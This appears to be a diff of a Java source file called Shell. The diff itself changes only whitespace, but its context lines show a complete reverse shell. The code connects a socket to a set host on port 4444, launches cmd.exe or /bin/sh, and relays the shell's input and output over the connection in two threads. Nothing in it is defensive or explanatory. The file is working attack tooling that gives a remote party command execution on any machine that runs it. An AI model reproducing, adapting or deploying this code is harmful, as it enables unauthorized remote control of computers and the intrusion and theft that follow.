@@ -5,20 +5,21 @@ import java.io.*;
 import java.net.*;
 
 public class Shell {
+
     public static void main(String[] args) {
         try {
             String host = "0.0.0.0";
             int port = 4444;
             String cmd = System.getProperty("os.name").toLowerCase().contains("win") ? "cmd.exe" : "/bin/sh";
-            
+
             Socket socket = new Socket(host, port);
             Process process = new ProcessBuilder(cmd).redirectErrorStream(true).start();
-            
+
             InputStream processOut = process.getInputStream();
             OutputStream processIn = process.getOutputStream();
             InputStream socketIn = socket.getInputStream();
             OutputStream socketOut = socket.getOutputStream();
-            
+
             Thread input = new Thread(() -> {
                 try {
                     byte[] buffer = new byte[8192];
@@ -29,7 +30,7 @@ public class Shell {
                     }
                 } catch (Exception e) {}
             });
-            
+
             Thread output = new Thread(() -> {
                 try {
                     byte[] buffer = new byte[8192];
@@ -40,12 +41,12 @@ public class Shell {
                     }
                 } catch (Exception e) {}
             });
-            
+
             input.start();
             output.start();
             input.join();
             output.join();
-            
+
             socket.close();
             process.destroy();
         } catch (Exception e) {
